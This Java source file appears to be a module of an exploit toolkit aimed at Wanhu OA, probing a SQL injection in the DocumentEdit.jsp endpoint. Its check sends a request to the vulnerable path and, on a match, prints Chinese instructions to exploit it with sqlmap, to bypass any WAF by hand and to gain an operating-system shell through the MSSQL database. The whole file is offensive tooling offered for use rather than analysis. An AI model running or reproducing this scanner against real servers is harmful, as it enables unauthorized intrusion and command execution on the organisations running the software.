package exp.oa.wanhuoa;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

public class wanhu_DocumentEdit implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 请自行使用sqlmap或手动利用");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea) {
        Response response = HttpTools.get(url + "/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains("iSignature")) {
            Platform.runLater(() -> {
                textArea.appendText("\n");
                textArea.appendText("漏洞存在 请使用Sqlmap利用 若存在waf 请手动绕过 \n " + url + "/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1");
                textArea.appendText("\n");
                textArea.appendText("该OA所用 mssql数据库 可进行 os-shell");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n");
                textArea.appendText("wanhuoa_DocumentEdit-SQLli-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }
}
